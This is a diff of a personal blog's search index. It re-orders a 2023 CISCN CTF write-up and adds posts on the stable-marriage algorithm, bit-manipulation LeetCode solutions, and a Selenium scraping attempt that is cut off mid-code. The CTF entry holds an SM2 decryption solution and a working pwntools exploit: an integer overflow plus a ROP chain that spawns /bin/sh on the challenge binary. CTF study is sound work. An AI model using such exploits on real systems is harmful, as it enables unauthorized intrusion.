@@ -1,31 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2023ciscn初赛总结</title>
-    <url>/2023/05/28/2023ciscn%E5%88%9D%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>2023ciscn初赛总结，赛后忘记交wp（</p>
-<h2 id="Crypto：国密报告">Crypto：国密报告</h2>
-<p>发请求拿到唯一id，随后生成密钥对A</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const sm2 = require(<span class="string">&#x27;sm-crypto&#x27;</span>).sm2</span><br><span class="line"></span><br><span class="line">let keypair = sm2.generateKeyPairHex()</span><br><span class="line"></span><br><span class="line">publicKey = keypair.publicKey // 公钥</span><br><span class="line">privateKey = keypair.privateKey // 私钥</span><br><span class="line"></span><br><span class="line">console.log(publicKey)</span><br><span class="line">console.log(privateKey)</span><br><span class="line"></span><br><span class="line">//044aa510d65be737ac8f2e0a38457915abc65f30e153a66f43e21c4d6b6cf9cbdb99afae316c5e9e217acdd45695da2f39746d9532e799be6e590495130d5c5b82   公钥A</span><br><span class="line">// 824a5860308e9dc6c3bca8848c70ffa80b82a2d30948d8fb0ceb398636a6d84f  私钥A</span><br><span class="line">//1faa445b-<span class="number">2125</span>-4f3c-aaec-d0d6ff9c56ef  <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-<p>发公钥，拿到密文，发id，拿到随机字符串和密钥B</p>
-<p><img src="https://s2.loli.net/2023/05/28/x4Hc2659PsYMFCQ.png" alt="wp2.png"></p>
-<p>至此有公钥私钥，解密：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"></span><br><span class="line">publicKey=<span class="string">&quot;049d69f37e8bd7803cf6932b70b7823a4d594c94c6b7f9b64afc7773b8cec028d50ff8034653bba346c17fd8afe37164a88e7fc6d2742b328d503b91c460dd3e59&quot;</span></span><br><span class="line">privateKey=<span class="string">&quot;3bfffb52adeafabae695c0df038cf971820fc56de0a797955d7a89a6b5ec7f0b&quot;</span></span><br><span class="line">qs_c=<span class="string">&quot;8140ab618a9ed8b180760cb091f566197ebe920c4507833ef29ed34ac438dc912b49b8f94fe693a96b2e516504ec21b856deda90a86414e345625e1eca0974d8f9c3bb14ed31a11141edc5cd40f1fb6bca8d88e279352be987f86993295433a220c89ba899cc748f3df33ad93dba93c5&quot;</span></span><br><span class="line"></span><br><span class="line">sm2_crypt = sm2.CryptSM2(public_key=spk, private_key=ssk, mode=<span class="number">1</span>)</span><br><span class="line">qs = sm2_crypt.decrypt(<span class="built_in">bytes</span>.fromhex(qs_c))</span><br><span class="line">qs = qs.<span class="built_in">hex</span>().upper()</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure>
-<p>发请求提交，发id查询</p>
-<p><img src="https://s2.loli.net/2023/05/28/V2abtfeUnN6Xo9g.png" alt="wp3.png"></p>
-<h1>Pwn：烧烤摊儿</h1>
-<p>点菜菜单存在整数溢出，可以把钱变多，改名环节存在栈溢出，溢出之后构造rop链调用syscall拿到shell，exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;123.56.251.120&#x27;,24551)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rax=<span class="number">0x458827</span></span><br><span class="line">syscall=<span class="number">0x4230a6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;3. 勇闯天涯\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4294367398&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x00000000004E8897</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall)+p64(pop_rdi)+p64(<span class="number">0x00000000004E8897</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line">p.sendline(flat(&#123;<span class="number">0x28</span>:payload&#125;))</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>希踢爱抚!</category>
-      </categories>
-      <tags>
-        <tag>密码</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Crypto:来自摸鱼哥的浅学</title>
     <url>/2022/09/04/Crypto-%E6%9D%A5%E8%87%AA%E6%91%B8%E9%B1%BC%E5%93%A5%E7%9A%84%E6%B5%85%E5%AD%A6/</url>
     <content><![CDATA[<p>来自一个学不明白堆的菜的研究：</p>
@@ -91,6 +66,31 @@
       <categories>
         <category>做题&amp;活动&amp;比赛の记录</category>
       </categories>
+  </entry>
+  <entry>
+    <title>2023ciscn初赛总结</title>
+    <url>/2023/05/28/2023ciscn%E5%88%9D%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>2023ciscn初赛总结，赛后忘记交wp（</p>
+<h2 id="Crypto：国密报告">Crypto：国密报告</h2>
+<p>发请求拿到唯一id，随后生成密钥对A</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const sm2 = require(<span class="string">&#x27;sm-crypto&#x27;</span>).sm2</span><br><span class="line"></span><br><span class="line">let keypair = sm2.generateKeyPairHex()</span><br><span class="line"></span><br><span class="line">publicKey = keypair.publicKey // 公钥</span><br><span class="line">privateKey = keypair.privateKey // 私钥</span><br><span class="line"></span><br><span class="line">console.log(publicKey)</span><br><span class="line">console.log(privateKey)</span><br><span class="line"></span><br><span class="line">//044aa510d65be737ac8f2e0a38457915abc65f30e153a66f43e21c4d6b6cf9cbdb99afae316c5e9e217acdd45695da2f39746d9532e799be6e590495130d5c5b82   公钥A</span><br><span class="line">// 824a5860308e9dc6c3bca8848c70ffa80b82a2d30948d8fb0ceb398636a6d84f  私钥A</span><br><span class="line">//1faa445b-<span class="number">2125</span>-4f3c-aaec-d0d6ff9c56ef  <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+<p>发公钥，拿到密文，发id，拿到随机字符串和密钥B</p>
+<p><img src="https://s2.loli.net/2023/05/28/x4Hc2659PsYMFCQ.png" alt="wp2.png"></p>
+<p>至此有公钥私钥，解密：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"></span><br><span class="line">publicKey=<span class="string">&quot;049d69f37e8bd7803cf6932b70b7823a4d594c94c6b7f9b64afc7773b8cec028d50ff8034653bba346c17fd8afe37164a88e7fc6d2742b328d503b91c460dd3e59&quot;</span></span><br><span class="line">privateKey=<span class="string">&quot;3bfffb52adeafabae695c0df038cf971820fc56de0a797955d7a89a6b5ec7f0b&quot;</span></span><br><span class="line">qs_c=<span class="string">&quot;8140ab618a9ed8b180760cb091f566197ebe920c4507833ef29ed34ac438dc912b49b8f94fe693a96b2e516504ec21b856deda90a86414e345625e1eca0974d8f9c3bb14ed31a11141edc5cd40f1fb6bca8d88e279352be987f86993295433a220c89ba899cc748f3df33ad93dba93c5&quot;</span></span><br><span class="line"></span><br><span class="line">sm2_crypt = sm2.CryptSM2(public_key=spk, private_key=ssk, mode=<span class="number">1</span>)</span><br><span class="line">qs = sm2_crypt.decrypt(<span class="built_in">bytes</span>.fromhex(qs_c))</span><br><span class="line">qs = qs.<span class="built_in">hex</span>().upper()</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure>
+<p>发请求提交，发id查询</p>
+<p><img src="https://s2.loli.net/2023/05/28/V2abtfeUnN6Xo9g.png" alt="wp3.png"></p>
+<h1>Pwn：烧烤摊儿</h1>
+<p>点菜菜单存在整数溢出，可以把钱变多，改名环节存在栈溢出，溢出之后构造rop链调用syscall拿到shell，exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;123.56.251.120&#x27;,24551)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rax=<span class="number">0x458827</span></span><br><span class="line">syscall=<span class="number">0x4230a6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;3. 勇闯天涯\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4294367398&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x00000000004E8897</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall)+p64(pop_rdi)+p64(<span class="number">0x00000000004E8897</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line">p.sendline(flat(&#123;<span class="number">0x28</span>:payload&#125;))</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>希踢爱抚!</category>
+      </categories>
+      <tags>
+        <tag>密码</tag>
+        <tag>pwn</tag>
+      </tags>
   </entry>
   <entry>
     <title>Java入门基础</title>
@@ -681,9 +681,151 @@
         <category>希踢爱抚!</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>基础</tag>
         <tag>入门</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stable marriages(稳定婚姻) problem</title>
+    <url>/2023/07/19/stable-marriages-%E7%A8%B3%E5%AE%9A%E5%A9%9A%E5%A7%BB-problem/</url>
+    <content><![CDATA[<p>稳定婚姻问题，from ubc-vsp23，感觉确实是一个有趣的问题。</p>
+<h3 id="问题">问题</h3>
+<p>问题本身：有n个男孩，n个女孩，每一个男孩有他对于所有女孩的排名，每一个女孩也有她对于所有男孩的排名，那么如何将他们配对呢？别tm说什么为什么一定要配对（  图示：</p>
+<p><img src="https://s2.loli.net/2023/07/20/csb8jqtRmlIk9Jh.png" alt="稳定婚姻问题.png"></p>
+<p>首先既然是稳定婚姻问题，我们得先定义出来什么是稳定，在婚姻问题中我们对稳定的定义是：不存在这样两队夫妻：她们彼此更喜欢另一对的另一半。emmm有点抽象，就是说男一和女一在一起，男二和女二在一起，如果男二和女一相互喜欢，那么这里的婚姻是不稳定的，不能出现这种情况。当然这样定义肯定会出现一个问题，这是第一个问题：**每一个喜好列表的人都能找到稳定的配对吗？**或者说，每一对情侣能找到一个保证稳定不分手的情况吗？这里有一个算法提出了一个解决方案：<strong>Gale-Shapley</strong>算法</p>
+<h3 id="Gale-Shapley算法">Gale-Shapley算法</h3>
+<p>算法步骤如下:</p>
+<ol>
+<li>初始时，所有的男性和女性都被标记为&quot;单身&quot;状态。</li>
+<li>从未与女性提出过求婚的男性中，选择一个男性。</li>
+<li>对于这个男性，按照他对女性的偏好顺序，从未被求婚过的女性中选择一位女性。</li>
+<li>如果这位女性是&quot;单身&quot;状态，则接受男性的求婚，两人形成婚姻配对。</li>
+<li>如果这位女性已经与其他男性形成婚姻配对，比较当前男性和已婚男性对女性的偏好，如果当前男性更受女性喜欢，则女性与当前男性解除婚姻关系，接受当前男性的求婚。</li>
+<li>如果这位女性拒绝当前男性的求婚，男性继续尝试向下一位女性提出求婚。</li>
+<li>重复步骤2-6，直到所有男性都提出过求婚。</li>
+</ol>
+<p>这确实是一个很有意思的问题，多想想可以多理解一点东西。</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>位运算</title>
+    <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
+    <content><![CDATA[<p>位运算基础概念以及题目：</p>
+<span id="more"></span>
+<h3 id="概念">概念</h3>
+<h4 id="位与">位与</h4>
+<p>符号：&amp;</p>
+<p>12&amp;10—&gt;1100&amp;1010（转换为二进制）</p>
+<p>从低到高按位运算，当两个数字都为1，结果才为1，否则为0，因此结果为1000，也就是8</p>
+<h4 id="位或">位或</h4>
+<p>符号：|</p>
+<p>12|10-----&gt;1100|1010</p>
+<p>从低到高按位运算，当两个数字都为0，结果才为0，否则为1，因此结果为1110，也就是14</p>
+<p>小概念：相同的数异或为0，任何数与0异或为它本身，满足交换律和结合律</p>
+<h4 id="异或">异或</h4>
+<p>符号：^</p>
+<p>12^10-----&gt;1100^1010</p>
+<p>从低到高按位运算，当两个数字都不同，结果才为1，否则为0，因此结果为0110，也就是6。</p>
+<p>从结果来看，异或可以看作不进位的加法</p>
+<h4 id="左移">左移</h4>
+<p>符号：&lt;&lt;</p>
+<p>12&lt;&lt;3-----&gt;1100&lt;&lt;3</p>
+<p>想左移三位，末尾补零，因此结果为1100000.另外，左移一位可以看作该数字乘二。</p>
+<h4 id="右移">右移</h4>
+<p>符号: &gt;&gt;</p>
+<p>12&gt;&gt;3-----&gt;1100&gt;&gt;3=1</p>
+<p>右移三位，右移一位可看作除二向下取整</p>
+<h3 id="例题">例题</h3>
+<h4 id="2的幂">2的幂</h4>
+<p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解析：当一个数为2的幂时，他的表达方式一定为100000…，这个数n表达方式固定，n-1则确定为0111111…。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
+<h4 id="4的幂">4的幂</h4>
+<p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
+<p>解析：分析可知：$2^{2x}mod 3=1$ 且 $2^{2x+1}mod 3=2$ 因此可以得出结论$4^xmod3=1$ 。因此，当一个数n是2的幂，同时模3为1，则他一定是4的幂</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isPowerOfFour(int n)&#123;</span><br><span class="line">    return (n&gt;0)&amp;&amp;(n&amp;(n-1))==0&amp;&amp;n % 3==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="位1的个数">位1的个数</h4>
+<p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
+<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为…1000时我们把它减去1，则变为形式…0111,当我们把这两个数进行位与运算，得到的结果为…0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">uint32_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="type">int</span> ans=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        n=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="交换数字">交换数字</h4>
+<p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
+<p>解法：</p>
+<ul>
+<li>a=a^b</li>
+<li>b=a^b=a^b^b=a^0=a</li>
+<li>a=a^b=a^a^b=b</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">swapNumbers</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> aSize, <span class="type">int</span>* returnSize)</span>&#123;</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">1</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="只出现一次的数字">只出现一次的数字</h4>
+<p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum^nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解法：很巧妙的解法，根据异或的性质，我们发现当我们从头开始循环异或，出现两次的数必然可以结合异或结果为0，最后只剩下异或结果为本身的数，这个数就是出现一次的数。(草，真的牛逼)</p>
+<h4 id="汉明距离">汉明距离</h4>
+<p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
+<p>解析：把两个数字异或，我们发现结果为1的位上就是两个数字对应二进制位不同的位置，因此我们把异或后的结果进行1消去，同时统计1的个数，答案就是汉明距离。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> n=x^y;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        n=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="交替位二进制数">交替位二进制数</h4>
+<p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
+<p>解析：题目意思可以视为判断数字n的二进制表达形式是否为01连续出现，我们判断当00和11出现时对应的十进制数字为0和3，因此我们将数字n与3位与，如果符合题意，得到的结果只能是10或者01，即为1，2，如果出现0，3，则说明n中出现了00，11的组合，则返回false。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="number">3</span>)==<span class="number">0</span>||(n&amp;<span class="number">3</span>)==<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="找出所有子集的异或总和再求和">找出所有子集的异或总和再求和</h4>
+<p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
+<p>解析：这个题我搞了半天（md我怎么这么菜），首先是我们要明白一个数组的子集个数是2的元素个数的次方，因此第一个循环是为了找到所有的子集，当我们找到所有子集之后，我们要对每一个子集进行分析，因为集合中的元素在子集中只会有两种状态，0（未出现）和1（出现），因此，<strong>每个子集都可以表示为一个二进制数字</strong>，比如数组[2,3,4]的子集之一[2,3]，用相对应的二进制数字来表示就是110。这样表示完每一个子集后，我们对每一个二进制数进行分析，当我们在二进制数中寻找到1时，说明对应的数组nums[i]在子集中存在，就可以进行异或操作了，而寻找二进制数中的1可以用一个表达式来解决:<strong>i&amp;(1&lt;&lt;j)</strong>。意思是寻找二进制数i在第j位是否为1。当第二次循环遍历二进制数位数之后，我们就可以确定存在的元素，就可以进行必要的异或和相加的操作了。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,ans;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;numsSize);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) ans^=nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="两整数之和">两整数之和</h4>
+<p>阴间题目，要求不能用+，-完成两数求和。</p>
+<p><a href="https://leetcode.cn/problems/sum-of-two-integers/">https://leetcode.cn/problems/sum-of-two-integers/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(<span class="type">unsigned</span> <span class="type">int</span>)(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析：首先已知a^b可以表示为不考虑a和b的情况下a和b的加和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数&quot;b&quot;为0的时候，这个时候进位完毕，输出结果a^b就是最后答案。</p>
+<h4 id="插入">插入</h4>
+<p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertBits</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> M, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        N&amp;=~((<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>&lt;&lt;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N|(M&lt;&lt;i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解析：博主摆烂了…</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>算法</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于爬虫的总结</title>
+    <url>/2023/06/01/%E5%85%B3%E4%BA%8E%E7%88%AC%E8%99%AB%E7%9A%84%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>最近在某著名985学子的压力下看了看了他们的python大作业，发现完全不会（，又是日常被薄纱的一天（，然后就有了这篇总结，记录一下这几天的历程。爬虫其实是属于我一直想学，一直没学的东西，正好趁这次机会迈出第一步。</p>
+<h2 id="request库-请求分析">request库+请求分析</h2>
+<p>这是我尝试的第一种方式，但是失败了。思路是通过fiddler工具对浏览器进行抓包，通过模拟正常用户的行为来分析请求，再用request库来进行发送请求。大作业的内容是爬取知网上的文献，内容包括题名，作者。首先我们先抓包，这是刚进入网页的请求：</p>
+<p><img src="https://s2.loli.net/2023/06/02/ETd1l6pkbQX7O8m.png" alt="抓包1 - 副本.png"></p>
+<p>这里说明网页发送get请求得到初始界面，这个过程我在postman里模拟发送请求也实现了，但是问题是出现在后面的请求中。接下来就是检索关键词之后发送的post请求，拿到一个具有多个文献名称，作者等信息的检索页面，请求头和请求体如下：</p>
+<p><img src="https://s2.loli.net/2023/06/02/OsyFlIHb5Ru4twW.png" alt="抓包2 - 副本.png"></p>
+<p><img src="https://s2.loli.net/2023/06/02/XneLh5WOa3rtlIT.png" alt="抓包3 - 副本.png"></p>
+<p>这里我用postman构造请求头和请求体发送请求，但是得到的却是下面这种情况，不知道是什么原因，后来我也是放弃了这种方式。当然有知道原因的或者是知道这种方法怎么做的请cue我一下（</p>
+<p><img src="https://s2.loli.net/2023/06/02/Krcie6a2vuwMIB9.png" alt="发请求 - 副本.png"></p>
+<h2 id="用selenium模拟浏览器操作">用selenium模拟浏览器操作</h2>
+<p>selenium是一个自动化测试的工具，可以模拟浏览器的行为，这样就模拟用户搜索信息的全过程，再把内容写入excel表就行</p>
+<p>首先配置好浏览器环境和条件：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">desired_capabilities = DesiredCapabilities.CHROME</span><br><span class="line">desired_capabilities[<span class="string">&quot;pageLoadStrategy&quot;</span>] = <span class="string">&quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌驱动器的环境</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置chrome不加载图片，提高速度</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.managed_default_content_settings.images&quot;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment"># 取消自动补全，不过我好像没看出来有什么用（</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-autocomplete&quot;</span>)</span><br><span class="line"><span class="comment"># # 设置不显示窗口</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建一个谷歌驱动器</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line"><span class="comment"># 设置搜索来源</span></span><br><span class="line">source = <span class="string">&quot;经济&quot;</span></span><br><span class="line"><span class="comment"># 设置所需篇数</span></span><br><span class="line">papers_need = <span class="number">100</span></span><br><span class="line"><span class="comment">#将窗口最大化，不然好像有点问题</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 